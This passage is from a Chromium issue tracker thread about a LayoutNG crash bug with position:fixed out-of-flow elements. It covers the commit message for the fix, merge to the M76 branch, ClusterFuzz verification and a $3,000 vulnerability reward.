with a counterexample that broke this fix.

Bug: 974760
Change-Id: Id16a0057f0aefe183c30c53244dd5c46108f093c
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1666809
Commit-Queue: Aleks Totic <atotic@chromium.org>
Reviewed-by: Emil A Eklund <eae@chromium.org>
Reviewed-by: Koji Ishii <kojii@chromium.org>
Cr-Commit-Position: refs/heads/master@{#670634}

[modify] https://crrev.com/cd815ad39e59ea3a66e67206f0105b1dd298da5f/third_party/blink/renderer/core/layout/ng/ng_container_fragment_builder.cc
[modify] https://crrev.com/cd815ad39e59ea3a66e67206f0105b1dd298da5f/third_party/blink/renderer/core/layout/ng/ng_container_fragment_builder.h
[modify] https://crrev.com/cd815ad39e59ea3a66e67206f0105b1dd298da5f/third_party/blink/renderer/core/layout/ng/ng_out_of_flow_layout_part.cc
[add] https://crrev.com/cd815ad39e59ea3a66e67206f0105b1dd298da5f/third_party/blink/web_tests/external/wpt/css/css-position/position-absolute-crash-chrome-009.html


### at...@chromium.org (2019-06-19)

Fix complete. Would like to merge to release.

### ab...@google.com (2019-06-19)

branch:3809

### sh...@chromium.org (2019-06-20)

[Empty comment from Monorail migration]

### cl...@chromium.org (2019-06-20)

ClusterFuzz testcase 5752682626809856 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=670633:670634

If this is incorrect, please add ClusterFuzz-Wrong label and re-open the issue.

### sh...@chromium.org (2019-06-24)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### na...@google.com (2019-06-24)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-06-28)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ea...@chromium.org (2019-07-02)

Merged into M76 branch 3809 as 0c371fb4f58ed5dc04bc9d25753df1a524d85503.

### cr...@appspot.gserviceaccount.com (2019-07-02)

The following revision refers to this bug: 
https://chromium.googlesource.com/chromium/src.git/+/0c371fb4f58ed5dc04bc9d25753df1a524d85503

Commit: 0c371fb4f58ed5dc04bc9d25753df1a524d85503
Author: atotic@chromium.org
Commiter: eae@chromium.org
Date: 2019-07-02 17:34:33 +0000 UTC

[LayoutNG] Fix DCHECK(NeedsLayout) for inline oof fixed container.

NGOutOfFlowLayoutDescendant.inline_container was not being set
correctly for an Element if:
- There is an OOF containing block between Element and
its Container(). This can only happens if Element is
position:fixed.

This caused Element not to be laid out after it got dirty (but
its containing block did not).

The fix is to set inline_container when Element's
NGOutOfFlowDesecendantCandidate gets propagated up the OOF
containing block chain.

For a while, I was afraid that this fundamentally broke
the concept of inline_container. I could not come up
with a counterexample that broke this fix.

(cherry picked from commit cd815ad39e59ea3a66e67206f0105b1dd298da5f)

Bug: 974760
Change-Id: Id16a0057f0aefe183c30c53244dd5c46108f093c
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1666809
Commit-Queue: Aleks Totic <atotic@chromium.org>
Reviewed-by: Emil A Eklund <eae@chromium.org>
Reviewed-by: Koji Ishii <kojii@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#670634}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1668067
Reviewed-by: Aleks Totic <atotic@chromium.org>
Cr-Commit-Position: refs/branch-heads/3809@{#704}
Cr-Branched-From: d82dec1a818f378c464ba307ddd9c92133eac355-refs/heads/master@{#665002}


### na...@google.com (2019-07-17)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### pa...@chromium.org (2019-07-17)

Congrats! The Panel decided to reward $3,000 for this report!

### na...@google.com (2019-07-18)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-09-26)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ke...@chromium.org (2020-03-30)

[Empty comment from Monorail migration]

### is...@google.com (2020-03-30)

This issue was migrated from crbug.com/chromium/974760?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40095414)*
